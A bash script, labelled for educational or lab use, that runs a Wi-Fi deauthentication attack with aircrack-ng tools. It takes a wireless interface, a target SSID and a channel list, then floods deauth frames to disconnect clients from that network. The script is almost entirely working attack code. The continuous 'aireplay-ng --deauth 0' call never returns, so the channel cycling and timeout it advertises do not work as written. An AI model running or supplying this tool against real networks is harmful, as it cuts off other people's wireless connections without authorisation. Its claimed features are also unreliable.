#!/bin/bash

# Simple Multi-Channel Deauth Script (Educational / Lab Use Only)
# Requirements: aircrack-ng, iw

# Colors
RED="\033[1;31m"
GREEN="\033[1;32m"
YELLOW="\033[1;33m"
CYAN="\033[1;36m"
RESET="\033[0m"

# Trap Ctrl+C
trap ctrl_c INT
ctrl_c() {
    echo -e "\n${RED}[!] Ctrl+C detected. Exiting...${RESET}"
    exit 0
}

# Banner
clear
echo -e "${CYAN}"
echo " ::::::::  ::::::::::     ::: ::::::::::: :::::::::   ::::::::  "
echo ":+:    :+: :+:          :+: :+:   :+:     :+:    :+: :+:    :+: "
echo "+:+    +:+ +:+         +:+   +:+  +:+     +:+    +:+ +:+        "
echo "+#+    +:+ +#++:++#   +#++:++#++: +#+     +#++:++#:  :#:        "
echo "+#+    +#+ +#+        +#+     +#+ +#+     +#+    +#+ +#+   +#+# "
echo "#+#    #+# #+#        #+#     #+# #+#     #+#    #+# #+#    #+# "
echo "#########  ########## ###     ### ###     ###    ###  ########  "
echo -e "${RESET}"

# Help function
show_help() {
    echo -e "${GREEN}Usage:${RESET} $0 -i <interface> -e <SSID> -C \"<channels>\""
    echo
    echo "Options:"
    echo "  -i <interface>    Wireless interface in monitor mode"
    echo "  -e <SSID>         Target SSID"
    echo "  -C <channels>     Channels to cycle through (e.g. \"1 6 11\")"
    echo "  -t <seconds>      Duration (default: infinite)"
    echo "  -h                Show this help"
    echo
    echo -e "${YELLOW}Example:${RESET}"
    echo "  $0 -i wlan0mon -e MyWiFi -C \"1 6 11\" -t 60"
    exit 0
}

# Defaults
TIMEOUT=0

# Parse arguments
while getopts "i:e:C:t:h" opt; do
    case $opt in
        i) INTERFACE=$OPTARG ;;
        e) SSID=$OPTARG ;;
        C) CHANNELS=$OPTARG ;;
        t) TIMEOUT=$OPTARG ;;
        h) show_help ;;
        *) show_help ;;
    esac
done

# Error handling
if [ -z "$INTERFACE" ]; then
    echo -e "${RED}[!] Error: Interface (-i) required${RESET}"
    exit 1
fi
if [ -z "$SSID" ]; then
    echo -e "${RED}[!] Error: SSID (-e) required${RESET}"
    exit 1
fi
if [ -z "$CHANNELS" ]; then
    echo -e "${RED}[!] Error: Channels (-C) required${RESET}"
    exit 1
fi



echo -e "${GREEN}[+] Starting deauth attack${RESET}"
echo -e "${YELLOW}[i] Interface: ${INTERFACE}${RESET}"
echo -e "${YELLOW}[i] Target SSID: ${SSID}${RESET}"
echo -e "${YELLOW}[i] Channels: ${CHANNELS}${RESET}"
[ "$TIMEOUT" -gt 0 ] && echo -e "${YELLOW}[i] Timeout: ${TIMEOUT} seconds${RESET}"
echo ""

start_time=$(date +%s)

while true; do
    for CH in $CHANNELS; do
        echo -e "${CYAN}[*] Switching ${INTERFACE} to channel ${CH}${RESET}"
        iw dev $INTERFACE set channel $CH
        echo -e "${RED}[!] Sending continuous deauth to SSID '${SSID}' on channel ${CH}${RESET}"
        aireplay-ng --deauth 0 -e "$SSID" $INTERFACE
    done

    if [ "$TIMEOUT" -gt 0 ]; then
        now=$(date +%s)
        elapsed=$(( now - start_time ))
        if [ $elapsed -ge $TIMEOUT ]; then
            echo -e "${GREEN}[+] Timeout reached. Exiting.${RESET}"
            exit 0
        fi
    fi
done
